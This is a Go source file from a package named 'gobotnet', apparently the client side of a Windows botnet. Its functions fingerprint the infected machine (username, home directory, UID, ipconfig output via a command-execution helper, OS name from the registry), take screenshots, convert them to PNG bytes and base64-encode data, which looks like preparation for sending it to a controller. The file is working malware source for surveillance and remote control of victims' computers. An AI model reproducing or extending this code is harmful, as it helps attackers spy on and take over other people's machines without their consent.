package gobotnet

import (
	"bytes"
	"encoding/base64"
	//"errors"
	"fmt"
	"github.com/satori/go.uuid"
	"github.com/vova616/screenshot"
	"golang.org/x/sys/windows/registry"
	"image"
	"image/png"
	//"io"
	//"io/ioutil"
	//"os"
	"os/user"
)

var (
	id uuid.UUID = uuid.NewV4()
)

func CmdTest() {
	fmt.Println("CMD_EXEC.GO TEST")
	// fmt.Println(GetName())
	// fmt.Println(GetOS())
	// fmt.Println(GetUid())
	// fmt.Println(GetUsername())
	// fmt.Println(GetHomeDir())
	// fmt.Println(GetIdentificator())

	// //image := GetScreenshot()
	//bytes, _ := ImageToBytes(image)
	//fmt.Println(bytes)
}

func GetIdentificator() string {
	ipConfigOut, _ := CmdExec("ipconfig")
	return id.String() + GetUsername() + string(ipConfigOut)
}

func GetUid() string {
	usr, _ := user.Current()
	return usr.Uid
}

func GetHomeDir() string {
	usr, _ := user.Current()
	return usr.HomeDir
}

func GetName() string {
	usr, _ := user.Current()
	return usr.Name
}

func GetUsername() string {
	usr, _ := user.Current()
	return usr.Username
}

func GetOS() string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion`, registry.READ)
	if err != nil {
		return ""
	}
	value, _, err := key.GetStringValue("ProductName")
	if err != nil {
		return ""
	}
	return value
}

func GetScreenshot() *image.RGBA {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		OutMessage(err.Error())
	}
	return img
}

func ImageToBytes(image *image.RGBA) ([]byte, error) {
	buf := new(bytes.Buffer)
	err := png.Encode(buf, image)
	imageBytes := buf.Bytes()
	return imageBytes, err
}

func ToBase64(bytes []byte) string {
	return base64.StdEncoding.EncodeToString(bytes)
}

func FromBase64(str string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(str)
}
